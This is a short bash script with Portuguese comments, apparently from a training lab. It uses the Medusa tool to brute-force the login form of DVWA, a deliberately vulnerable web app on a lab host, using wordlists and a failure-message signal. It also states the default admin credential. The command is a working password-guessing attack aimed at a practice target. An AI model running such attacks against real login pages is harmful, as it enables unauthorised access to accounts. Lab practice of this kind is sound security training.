#!/bin/bash
# Cenário 2 - DVWA Web-Form Brute Force com Medusa - Lab riad
# Pré-requisito: DVWA Security Level = Low em http://<IP-MS2>/dvwa/
# Uso: ./commands/dvwa-medusa.sh 192.168.56.101
BASEDIR="$(cd "$(dirname "$0")/.." && pwd)"
WORDLIST_U="$BASEDIR/wordlists/users.txt"
WORDLIST_P="$BASEDIR/wordlists/passwords.txt"
IP_MS2="${1:-<IP-MS2>}"
echo "[*] DVWA brute force contra $IP_MS2"
echo "[!] Confira: login no DVWA, Security -> Low, abra /vulnerabilities/brute/"
medusa -h "$IP_MS2" -U "$WORDLIST_U" -P "$WORDLIST_P" -M web-form \
  -m FORM:"/dvwa/vulnerabilities/brute/" \
  -m DENY-SIGNAL:"Username and/or password incorrect" \
  -m FORM-DATA:"username=&password=&Login=Login" -v 6
echo ""
echo "[*] Dica: inspecione o form no DevTools se o DENY-SIGNAL mudar."
echo "Em Low o user padrão é admin:password"
